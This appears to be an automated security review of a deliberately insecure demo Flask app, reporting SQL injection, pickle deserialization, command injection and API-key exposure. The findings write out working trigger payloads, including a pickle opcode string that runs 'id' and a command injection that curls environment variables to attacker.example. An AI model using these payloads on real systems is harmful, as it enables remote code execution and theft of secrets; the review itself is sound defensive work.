**Verdict:** REQUEST CHANGES

**Score:** 5 / 100 — four independently exploitable criticals in a 40-line file; no hardening, no mitigations, no tests.

### Summary
`demo/insecure/app.py` packs four confirmed high-to-critical vulnerabilities into four endpoints. Each sink is reachable with zero auth and accepts raw untrusted input. This file is a demo but would be **catastrophic** if deployed.

### Blocking
All four findings below are individually blocking. Fixing one while leaving the others is insufficient.

### Security audit: No

- CWE-89: SQL injection — `/search` endpoint
- CWE-502: Insecure deserialization — `/load` endpoint
- CWE-78: Command injection — `/run` endpoint
- CWE-200/CWE-798: Secrets exposure — `/secret` endpoint

### Key findings

1. **SQL Injection (CWE-89)** — `demo/insecure/app.py:16`
   `cur.execute(f"SELECT * FROM items WHERE name = '{q}'")` interpolates `request.args.get("q")` directly into SQL via f-string. No parameterization, no escaping.
   - **Trigger:** `GET /search?q=' OR 1=1 --` dumps the entire `items` table.
   - **Severity:** Critical. Full table read, potential data exfiltration, and with stacked queries (if enabled) data modification/deletion.
   - **Match:** TP signature `sqli-search` (effective_score=0.95, 15 hits across tenants).

2. **Insecure Deserialization (CWE-502)** — `demo/insecure/app.py:22`
   `pickle.loads(data)` deserializes untrusted `request.data` (raw POST body). Arbitrary code execution on deserialization.
   - **Trigger:** `POST /load` with a crafted pickle payload (e.g., `cos\nsystem\n(S'id'\ntR.`) executes `id` on the server.
   - **Severity:** Critical. Remote code execution; full server compromise.
   - **Match:** TP signature `pickle-load` (effective_score=0.95).

3. **Command Injection (CWE-78)** — `demo/insecure/app.py:28`
   `subprocess.check_output(cmd, shell=True)` executes `request.args.get("cmd")` through a shell with zero sanitization.
   - **Trigger:** `GET /run?cmd=; cat /etc/passwd` or `GET /run?cmd=; curl http://attacker.example/exfil?d=$(env)` chains arbitrary commands.
   - **Severity:** Critical. Shell-level RCE; exfil, reverse shell, lateral movement.
   - **Match:** TP signature `cmdi-run` (effective_score=0.95).

4. **Secrets Exposure (CWE-200/CWE-798)** — `demo/insecure/app.py:33`
   `os.environ.get("OPENROUTER_API_KEY")` is returned verbatim in the HTTP response. Any caller (unauthenticated) retrieves the API key.
   - **Trigger:** `GET /secret` returns `{"key": "sk-or-v1-..."}` in plaintext.
   - **Severity:** High. Credential theft; abusable for LLM API spend and impersonation.
   - **Match:** TP signature `secret-exposure` (effective_score=0.95).

### Tests & risk

- **No tests exist** for any of these endpoints. No negative tests, no fuzzing, no input validation tests.
- **Deployment risk:** if this file is accidentally deployed (e.g., mounted as a debug route in staging/prod), all four sinks are exploitable immediately with no auth gate, no rate limiting, no WAF-visible signatures.

### What I checked

- **Archival memory:** 8 hits, all 4 TP signatures (`sqli-search`, `pickle-load`, `cmdi-run`, `secret-exposure`) reconsolidated with hub boost. All match `demo/insecure/app.py` path globs.
- **Memory CLI:** 8 hits confirming the same 4 TP themes with path-evidenced matches.
- **Doctor:** all subsystems pass (recovery, recon, hub, refine, router) — gate infrastructure healthy.
- **Diff scope:** the file itself is the full source; all 4 endpoints reviewed end-to-end.

### Multi-lens checklist

| Lens | Status | Note |
|---|---|---|
| Injection (SQL/NoSQL/LDAP) | **concern** | `app.py:16` — f-string SQL injection, CWE-89 |
| AuthN / AuthZ bypass | n/a | No auth present to bypass |
| Secrets / credential exposure | **concern** | `app.py:33` — `OPENROUTER_API_KEY` exposed |
| XSS / output escaping | n/a | JSON responses, no HTML rendering |
| CSRF | n/a | No state-changing GETs; POSTs accept raw body |
| SSRF | n/a | No outbound HTTP from app |
| Path traversal | n/a | No file-system reads |
| Unsafe deserialization | **concern** | `app.py:22` — `pickle.loads()`, CWE-502 |
| Command / shell injection | **concern** | `app.py:28` — `shell=True` with untrusted input, CWE-78 |
| Crypto misuse | n/a | No crypto operations |
| Supply chain / deps | ok | Standard library + Flask + sqlite3; no unusual deps |
| DoS / unbounded work | ok | No unbounded loops or resource exhaustion visible in diff |

**— Torii Gate**
